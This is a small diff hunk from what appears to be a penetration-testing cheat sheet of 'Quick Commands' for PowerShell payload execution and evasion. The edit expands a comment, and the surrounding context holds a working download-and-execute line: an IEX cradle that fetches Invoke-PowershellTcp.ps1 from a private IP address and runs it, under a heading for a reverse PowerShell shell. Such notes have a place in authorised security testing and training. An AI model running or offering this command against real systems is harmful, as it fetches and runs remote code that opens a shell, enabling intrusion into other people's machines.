@@ -12,7 +12,7 @@ https://medium.com/swlh/fun-with-powershell-payload-execution-and-evasion-f5051f
 - ---] Quick Commands
 =====================
 
-# Invoke Expressions (IEX)
+# Invoke Expressions (IEX) - Download and run ps1 (Make sure function is called at bottom of ps1 script)
 IEX(New-Object Net.WebClient).downloadString('http://192.168.119.232/Invoke-PowershellTcp.ps1')
 
 # Reverse powershell
